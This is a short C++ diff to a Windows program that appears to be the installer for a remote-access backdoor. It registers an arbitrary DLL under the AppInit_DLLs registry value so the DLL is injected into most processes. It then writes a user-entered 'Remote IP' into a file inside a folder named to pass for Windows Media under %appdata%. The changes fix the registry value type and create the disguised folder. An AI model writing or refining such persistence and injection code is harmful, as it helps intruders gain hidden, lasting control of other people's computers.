@@ -3,6 +3,7 @@
 
 #include <iostream>
 #include <fstream>
+#include <direct.h>
 #include <windows.h>
 #include <conio.h>
 
@@ -45,22 +46,30 @@ int main()
 	cin.getline(buff, 299);
 
 	RegSetValueExA(hKey64, "AppInit_DLLs", 0, REG_SZ, (BYTE*)buff, strlen(buff));
-	RegSetValueExA(hKey64, "LoadAppInit_DLLs", 0, REG_QWORD, (const BYTE*)&dwBytes, 8);
+	RegSetValueExA(hKey64, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&dwBytes, 4);
 
 	// %appdata%에 IP등록
 
 	char* appdata;
+	char path[150] = "";
 	char dir[150] = "";
 
 	_dupenv_s(&appdata, NULL, "appdata");
+	strcpy_s(path, appdata);
 	strcpy_s(dir, appdata);
-	strcat_s(dir, "\\Windows Media\\ini");
+
+	strcat_s(path, "\\Windows Media\\ini");
+	strcat_s(dir, "\\Windows Media");
+
+	_mkdir(dir);
 
 	char IP[20] = "";
-	std::fstream st(dir);
+	std::ofstream st(path);
 
 	cout << "Remote IP : ";  cin >> IP;
 	st.write(IP, strlen(IP));
+
+	st.close();
 }
 
 // 프로그램 실행: <Ctrl+F5> 또는 [디버그] > [디버깅하지 않고 시작] 메뉴
